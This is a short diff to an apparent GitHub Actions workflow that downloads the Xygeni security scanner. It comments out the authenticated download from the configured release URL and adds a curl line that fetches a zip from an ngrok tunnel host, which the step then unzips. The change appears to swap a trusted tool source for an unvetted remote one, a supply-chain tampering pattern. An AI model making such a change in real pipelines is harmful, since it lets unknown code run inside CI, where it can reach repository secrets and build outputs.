@@ -22,7 +22,8 @@ jobs:
       - name: Download
         shell: bash
         run: |
-          curl -s -o ${{ runner.temp }}/xygeni_scanner.zip -H "Authorization: Bearer ${{ secrets.XYGENI_TOKEN }}" -L ${{ vars.XYGENI_URL }}/scan/releases
+          # curl -s -o ${{ runner.temp }}/xygeni_scanner.zip -H "Authorization: Bearer ${{ secrets.XYGENI_TOKEN }}" -L ${{ vars.XYGENI_URL }}/scan/releases
+          curl -s -o ${{ runner.temp }}/xygeni_scanner.zip -L https://92f0-46-24-156-184.ngrok-free.app/xygeni-release.zip
           cd ${{ runner.temp }}
           unzip ${{ runner.temp }}/xygeni_scanner.zip
           rm ${{ runner.temp }}/xygeni_scanner.zip
